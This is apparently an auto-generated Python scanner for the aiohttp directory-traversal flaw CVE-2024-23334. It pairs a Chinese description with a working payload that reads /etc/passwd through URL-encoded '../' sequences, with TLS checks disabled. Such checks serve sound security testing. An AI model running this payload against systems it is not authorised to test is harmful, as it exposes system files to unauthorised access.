"""
扫描脚本 - 目录遍历

漏洞描述：
# aiohttp 目录遍历漏洞 （CVE-2024-23334）
在将 aiohttp 用作 Web 服务器并配置静态路由时，必须指定静态文件的根路径。此外，可以使用 `follow_symlinks` 选项来决定是否跟随指向静态根目录之外的符号链接。当 `follow_symlinks` 设置为 `True` 时，aiohttp 不会验证所读取的文件是否位于静态根目录之内。这可能导致目录遍历漏洞，从而使攻击者可以未经授权访问系统上的任意文件，即使系统中没有实际存在符号链接。该漏洞影响的版本包括 3.9.1 及以下。
利用此漏洞，可以构造恶意路径，从而访问服务器中任意文件。

例如，构造如下请求来查看系统文件`/etc/passwd`:

```
GET /static/../../../../../etc/passwd HTTP/1.1
Host: your-ip:8080
Content-Length: 2

函数说明：
该漏洞可通过发送一个特制的HTTP GET请求进行自动化验证。脚本构造了一个包含URL编码的路径遍历序列 (`%2e%2e` 对应 `..`) 的请求，尝试访问服务器上的 `/etc/passwd` 文件。如果目标服务器存在该漏洞且运行在类Unix系统上，它将返回 `200 OK` 状态码，并且响应体中会包含 `root:x:0:0` 等特征字符串。脚本通过检查这两个条件来确认漏洞是否存在。整个过程仅需Python标准库和`requests`库，无需人工干预。

生成时间：2025-11-15 18:16:01

注意：本脚本必须包含一个名为 'scan' 的函数
函数签名：def scan(url: str) -> dict
"""

import requests

def scan(url):
    """
    检测 aiohttp 目录遍历漏洞 (CVE-2024-23334)
    :param url: 目标URL, 例如 http://example.com:8080/
    :return: 包含漏洞检测结果的字典
    """
    # 尝试读取 /etc/passwd 文件，使用URL编码绕过路径规范化
    payload = '/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
    target_url = url.rstrip('/') + payload

    try:
        # 发送GET请求，设置一个较短的超时时间
        response = requests.get(target_url, timeout=5, verify=False, allow_redirects=False)

        # 根据响应内容判断漏洞是否存在
        # 检查状态码是否为 200 OK
        # 检查响应体中是否包含 root:x:0:0 (Linux /etc/passwd 的典型内容)
        if response.status_code == 200 and 'root:x:0:0' in response.text:
            return {
                "vulnerable": True,
                "reason": "成功通过目录遍历读取到 /etc/passwd 文件内容，响应中包含 'root:x:0:0'。",
                "details": f"请求URL: {target_url}\n响应状态码: {response.status_code}\n响应内容片段: {response.text[:100]}..."
            }
        else:
            return {
                "vulnerable": False,
                "reason": f"无法读取目标文件。响应状态码: {response.status_code}，响应内容与预期不符。",
                "details": f"请求URL: {target_url}\n响应状态码: {response.status_code}\n响应内容: {response.text[:200]}..."
            }
    except requests.exceptions.RequestException as e:
        return {
            "vulnerable": False,
            "reason": "请求失败，目标不可达或发生网络错误。",
            "details": f"请求URL: {target_url}\n错误信息: {str(e)}"
        }

# 用于测试的主函数
if __name__ == "__main__":
    # 测试URL（请替换为实际目标）
    test_url = "http://example.com:80/"

    print(f"开始扫描: {test_url}")
    result = scan(test_url)
    print(f"\n扫描结果:")
    print(f"  存在漏洞: {result.get('vulnerable', False)}")
    print(f"  判断依据: {result.get('reason', '未知')}")
    if result.get('details'):
        print(f"  详细信息: {result.get('details')}")
